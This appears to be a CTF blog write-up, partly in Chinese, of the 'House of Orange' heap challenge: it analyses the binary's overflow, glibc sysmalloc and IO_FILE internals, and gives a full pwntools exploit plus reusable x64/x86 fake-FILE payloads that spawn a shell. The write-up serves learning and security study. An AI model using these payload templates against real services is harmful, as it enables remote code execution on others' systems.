---
title: House of Orange
date: 2019-03-02 21:28:37
tags: heap pwn house
layout: post
---
House of Orange 
<!--more-->
# Start
长久没用今天做IO_FILE的时候重做了一遍感觉 理解更深。
顺便追了一下关于IO_FILE的源码

# Analysis
程序主要有两个结构体:info & house
```python
info            struc ; (sizeof=0x8, mappedto_9)
00000000 price           dd ?
00000004 color           dd ?
00000008 info            ends
00000008


house
00000000 house           struc ; (sizeof=0x10, mappedto_6)
00000000 infomation      dq ?                    ; offset
00000008 name            dq ?
00000010 house           ends
```
主要功能有：
* add():4次
* upgrade():3次
* show()

保护全开

# 漏洞分析

主要漏洞点比较清楚edit的时候可以任意输入size
```python
int edit()
{
  info *info_ptr; // rbx
  unsigned int size; // [rsp+8h] [rbp-18h]
  signed int color_num; // [rsp+Ch] [rbp-14h]

  if ( times > 2u )
    return puts("You can't upgrade more");
  if ( !ptr )
    return puts("No such house !");
  printf("Length of name :");
  size = read_int();
  if ( size > 0x1000 )
    size = 4096;
  printf("Name:");
  read_n((void *)ptr->name, size);              // over flow
  printf("Price of Orange: ", size);
  info_ptr = ptr->infomation;
  info_ptr->price = read_int();
  show_color();
  printf("Color of Orange: ");
  color_num = read_int();
  if ( color_num != 56746 && (color_num <= 0 || color_num > 7) )
  {
    puts("No such color");
    exit(1);
  }
  if ( color_num == 56746 )
    ptr->infomation->color = 56746;
  else
    ptr->infomation->color = color_num + 30;
  ++times;
  return puts("Finish");
}
```
# 前置技能

## 0x00 sysmalloc
```python
    '''
    If have mmap, and the request size meets the mmap threshold, and
     the system supports mmap, and there are few enough currently
     allocated mmapped regions, try to directly map this request
     rather than expanding top.
    '''
    two assert s
    '''
    assert ((old_top == initial_top (av) && old_size == 0) ||
        ((unsigned long) (old_size) >= MINSIZE &&
         prev_inuse (old_top) &&
         ((unsigned long) old_end & pagemask) == 0));
 
    assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));

    '''

    * old_size > 0x1f
    * old_size & 1==1 
    * (old_top+old_size)&0xfff=0
    * size > old_size
```
所以可以修改topchunk_size malloc 一个较大的chunk 把原来的chunk放入unsorted bin

## 0x01 printerr
source is the best teacher
```python
malloc_printerr (const char *str)
{
  __libc_message (do_abort, "%s\n", str);
  __builtin_unreachable ();
}
```
and abort will call fflush
```python
int
_IO_fflush (FILE *fp)
{
  if (fp == NULL)
    return _IO_flush_all ();
  else
    {
      int result;
      CHECK_FILE (fp, EOF);
      _IO_acquire_lock (fp);
      result = _IO_SYNC (fp) ? EOF : 0;
      _IO_release_lock (fp);
      return result;
    }
}
```
and _IO_flush_all will call _IO_flush_all_lockp
```python
_IO_flush_all (void)
{
  /* We want locking.  */
  return _IO_flush_all_lockp (1);
}
```
and it will call _IO_flush_all_lockp
```python
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  FILE *fp;
#ifdef _IO_MTSAFE_IO
  _IO_cleanup_region_start_noarg (flush_cleanup);
  _IO_lock_lock (list_all_lock);
#endif
  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
    {
      run_fp = fp;
      if (do_lock)
        _IO_flockfile (fp);
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
           || (_IO_vtable_offset (fp) == 0
               && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                                    > fp->_wide_data->_IO_write_base))
           )
          && _IO_OVERFLOW (fp, EOF) == EOF)
        result = EOF;
      if (do_lock)
        _IO_funlockfile (fp);
      run_fp = NULL;
    }
#ifdef _IO_MTSAFE_IO
  _IO_lock_unlock (list_all_lock);
  _IO_cleanup_region_end (0);
#endif
  return result;
}
```
this function will clear the list of file
## IO_list_all
IO_FILE 是一个单链表结构 chain指针指向下一个fp
而IO_list_all指向第一个IO_file
```python
IO_list_file====>stderr     ====>stdout     =====>stdin
                    ...     I       ...     I
                    ...     I       ...     I
                    ...     I       ...     I
                    chain== I     chain==== I
                    ...             ...     
```
如上抽象画
而新链入得fp->chain指向原来的第一项
IO_list_file 指向fp
```c
struct _IO_FILE
{
  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;        /* Current read pointer */
  char *_IO_read_end;        /* End of get area. */
  char *_IO_read_base;        /* Start of putback+get area. */
  char *_IO_write_base;        /* Start of put area. */
  char *_IO_write_ptr;        /* Current put pointer. */
  char *_IO_write_end;        /* End of put area. */
  char *_IO_buf_base;        /* Start of reserve area. */
  char *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

# solution
* leak
    * no free，but we can use free in sysmalloc
    * 通过overwrite topchunk
    * malloc big chunk and then topchunk will be put in unsortedbin
    * malloc >512 we can get libc&heap address #large bin
    * leak finished
* cant do force because chunk size<0x10000
* we can use unsorted bin atk to make &main_arena+88 == _IO_list_all
* so main_arena+88 is the first IO_FILE struct but we cant control main_arene
* so we should fill main_arena+88+0x60  with fake_chunk_address
* main_arena+88+0x60 is the 0x60:smallbin[4]
* so we upgrade to over write the unsorted bin like
```python
fake = "/bin/sh\x00"+p64(0x61)+p64(0)+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])
```
* then call malloc to call printerr

# EXP
```python
#utf-8
from pwn import *
#context.log_level='debug'
def cmd(c):
	p.sendlineafter("Your choice : ",str(c))
def add(size,name,price=0,color=2):
	cmd(1)
	p.sendlineafter("Length of name :",str(size))
	p.sendafter("Name :",name)
	p.sendlineafter("Price of Orange:",str(price))
	p.sendlineafter("Color of Orange:",str(color))
def show():
	cmd(2)
def edit(size,name,price=0,color=2):
	cmd(3)
	p.sendlineafter("Length of name :",str(size))
	p.sendafter("Name:",name)
	p.sendlineafter("Price of Orange:",str(price))
	p.sendlineafter("Color of Orange:",str(color))
p=process("./orange")

add(0x18,"AAAA")#0
edit(0x70,p64(0)*3+p64(0x21)+p64(0)*3+p64(0xfa1)+p64(0))

add(0xff0,"BBBB")#1
add(0x608,"\n")#2

#leak
show()
p.readuntil("Name of house : \n")
base=u64(("\x00"+p.readline()[:-1]+"\x00").ljust(8,'\x00'))-(0x7ffff7dd2100-0x00007ffff7a0d000)
edit(0x20,"A"*0x10)
show()
p.readuntil("A"*0x10)
heap=u64((p.readline()[:-1]).ljust(8,'\x00'))-(0x5555557580c0-0x0000555555758000)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address=base
#gdb.attach(p,'b _IO_flush_all_lockp')
log.warning(hex(base))
log.warning(hex(heap))
#leak over
#sizeof (IO_FILE+8)=0xa0
fio=heap+0x5555557586f0-0x0000555555758000
payload="A"*0x608+p64(0x21)+p64(0)*2
fake = "/bin/sh\x00"+p64(0x61)+p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])
payload=payload+fake
edit(0xfff,payload)

cmd(1)
p.interactive()
```



# Modules
x64
```python
fake = "/bin/sh\x00"+p64(0x61)+p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])
```
x86
```python
fake = "sh\x00\x00"+p32(0x31)+p32(libc.symbols['system'])+p32(libc.symbols['_IO_list_all']-0x8)+p32(0)+p32(1)
fake =fake.ljust(0x48,'\x00')+p32(fio+0x4)
fake =fake.ljust(0x88,'\x00')+p32(1)
fake = fake.ljust(0x94, '\x00')+p32(fio+0x94-0x8)+p32(libc.symbols['system'])
```
